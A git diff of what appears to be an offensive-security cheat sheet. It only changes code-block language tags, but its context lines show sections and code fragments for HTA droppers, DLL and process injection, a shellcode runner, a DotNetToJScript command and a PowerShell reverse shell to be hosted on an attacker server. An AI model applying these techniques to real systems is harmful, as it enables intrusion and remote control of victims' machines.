@@ -47,7 +47,7 @@ DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
 <br>
 
 ## Create HTA file
-```jscript
+```javascript
 <head> 
 <script language="JScript"> 
 function setversion() { 
@@ -105,7 +105,7 @@ or
 
 ## DLL Injection
 
-```
+```csharp
 using System;
 using System.Diagnostics;
 using System.Net;
@@ -171,7 +171,7 @@ addr, 0, IntPtr.Zero);
 
 ## Shellcode Runner
 
-```
+```csharp
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -221,7 +221,7 @@ IntPtr.Zero);
 
 ## Process injection
 
-```
+```csharp
 using System;
 using System.Runtime.InteropServices;
 namespace Inject
@@ -333,7 +333,7 @@ End Sub••••ˇˇˇˇ
 
 - ### Replace ip/port, save as .txt file and host on your server
 
-```
+```powershell
 function cleanup {
 if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
